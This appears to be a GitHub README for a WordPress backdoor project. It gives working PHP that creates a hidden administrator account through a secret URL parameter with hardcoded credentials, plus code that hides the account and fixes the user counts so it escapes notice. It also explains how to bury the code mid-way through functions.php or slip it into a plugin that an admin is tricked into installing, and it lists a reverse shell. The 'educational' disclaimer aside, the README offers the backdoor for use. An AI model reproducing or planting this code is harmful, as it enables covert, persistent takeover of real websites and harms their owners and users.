![logo](/logo.png)
![version](https://img.shields.io/badge/version-1.0-blue) ![version](https://img.shields.io/badge/tested-locally-green) ![version](https://img.shields.io/badge/language-PHP-purple)

## Huge Update!

![version](https://img.shields.io/badge/version-2.0-blue)

**I have decided to take this repo a step further and make a step by step guide on how to implement it in a real case scenario with a phishing campaign based on a recently delivered phishig campaign to WordPress admins. [Here](https://amtzespinosa.github.io/posts/wordpress-backdoor-plugin/) you can check the full article!**

## Disclaimer
**This is for educational purposes only.** I am not liable for any indirect, incidental, special, consequential or punitive damages, or any loss of profits or revenue, whether incurred directly or indirectly, or any loss of data, use, goodwill, or other intangible losses, resulting from 

 1. your access to this resource and/or inability to access this resource
 2. any conduct or content of any third party referenced by this resource, including without limitation, any defamatory, offensive or illegal conduct or other users or third parties
 3. any content obtained from this resource.

## Files

 - [backdoor.php](/backdoor.php) - code to set the backdoor.
 - [hidden_admin.php](/hidden_admin.php) - code to hide users (the user created by backdoor.php).
 - [wp-backdoor.zip](/wp-backdoor.zip) - the code made WordPress plugin.
 - [wp-backdoor.php](/wp-backdoor/wp-backdoor.php) - code used for the plugin.
 - [reverse_shell.php](/reverse_shell.php) - Pentest Monkey PHP Reverse Shell. Old but gold.

## Proof of Concept
Many times I have asked myself how to maintain access to a compromised **WordPress** site for the sake of surveillance/data gathering/etc... Apart from reverse shells, of course, because I see some issues with the reverse shells stuff. I know they're all rectifiable but there are many things to have into consideration if in a rush:

 1. You have to throw the reverse shell to your IP - revealing info about you.
 2. Proxy then! - I don't trust free proxies... they're down, slow, instable...
 3. A reverse shell is just that: a shell - you can do a lot of stuff but it's not an easy GUI.
 4. Not precisely hidden - unless you hide the malicious code really well, it will be detected very fast.
 5. And after you get the shell you have to escalate privileges.

So I thought... what about **a dormant/hidden admin account** you can activate whenever you want and access (via wp-login) the core of the site inadvert?

Well, here's the first draft of this thought.

The starting point is: **you already have access.** How? That's up to you and beyond the scope of this code. But, in case you want to use it to gain access, you'll need a Trojan Horse and good social engineering skills.

To explain the **WP Backdoor** I will divide the code in three parts: 

 1. Creating the admin user.
 2. Hiding the admin user.
 3. Installing the backdoor.

## Creating the new_admin

WordPress allows us to do everything by code. That means we can actually create users with a few lines of code. But to go further, let's trigger that user creation by visiting a specific URL:

    add_action( 'wp_head', 'wp_backdoor' );
    
    function  wp_backdoor() {
	    if ( $_GET['backdoor'] == 'go' ) {
		    require( 'wp-includes/registration.php' );
		    if ( !username_exists( 'new_admin' ) ) {
			    $user_id = wp_create_user( 'new_admin', 'new_pass' );
			    $user = new  WP_User( $user_id );
			    $user->set_role( 'administrator' );
		    }
	    }
    }

By visiting the URL: *https://[insert website here]*/**?backdoor=go**, automatically a new user called **new_admin** will be created. This new user will have the role of administrator and its privileges and the password would be **new_pass.**

Now we have the user but it's in plain sight and would be easily noticed by others. So it's time to hide it!

## Hiding the new_admin

This code has two parts: hiding the **new_admin** and making everything look right.

Code for hiding a user:

    add_action('pre_user_query','dt_pre_user_query');
    
    function  dt_pre_user_query($user_search) {
	    global  $current_user;
	    $username = $current_user->user_login;

	    if ($username != 'new_admin') {
		    global  $wpdb;
		    $user_search->query_where = str_replace('WHERE 1=1',
			    "WHERE 1=1 AND {$wpdb->users}.user_login != 'new_admin'",$user_search->query_where);
        }
    }

But without the next piece of code there would be some hints that something is happening. In example: there's only one admin but the total count of admins is 2. Funky...

So let's correct those flaws...

    add_filter("views_users", "dt_list_table_views");
    
    function  dt_list_table_views($views){
	    $users = count_users();
	    $admins_num = $users['avail_roles']['administrator'] - 1;
	    $all_num = $users['total_users'] - 1;
	    $class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
	    $class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
	    $views['administrator'] = '<a href="users.php?role=administrator" class="'  .  $class_adm  .  '">'  .  translate_user_role('Administrator') .  ' <span class="count">('  .  $admins_num  .  ')</span></a>';
	    $views['all'] = '<a href="users.php" class="'  .  $class_all  .  '">'  .  __('All') .  ' <span class="count">('  .  $all_num  .  ')</span></a>';
	    return  $views;
    }

And there we go! Now our backdoor would be unnoticed unless someone carries out a thorough scan of the site. But... How can we stuff this code into a WordPress site?

Well, here are some ways. Sure there are more. Let your imagination be the limit!

## Setting up the backdoor
Depending on your intentions this would be your first or your last step. If you are using this method for persistence then it would be your last step and you should have access already.

In case you want to gain access, you should start here.

### Persistence

If you already have access, just copy the three code blocks together into **functions.php.** Not on top, not at the bottom, right in the middle. I have tried to do it around line 150. With a quick look to the code it looks legit.

Once it's pasted and saved, backdoor is ready to be used. 

### Gain access

We can hide this malicious code into a WordPress plugin. This method can be used for persistance as well but have some inconvenients. The main one is that, once the plugin is deactivated, so does the hiding code and your backdoor would be visible.

We can make our own plugin to disguise the code or download a legit plugin, stuff it inside and - for both cases with a bit of social engineering, make the admin install the plugin.

I am giving you a simple plugin containing just the malicious code. It is not disguised, just a sample. If you feel like, you can also learn how to make legit plugins with the WordPress documentation. 

## Final thoughts
I know this could be better. And it will. My future improvements would probably go around using a plugin to write into functions.php so once it is activated, code is stuffed in functions.php and the plugin is not needed anymore.

Be careful who you let in your site. Update everything, revise the core code and delete  unuseful stuff you don't need.

That's it. If you want to add more info, code or anything I'll be pleased. Happy hacking!

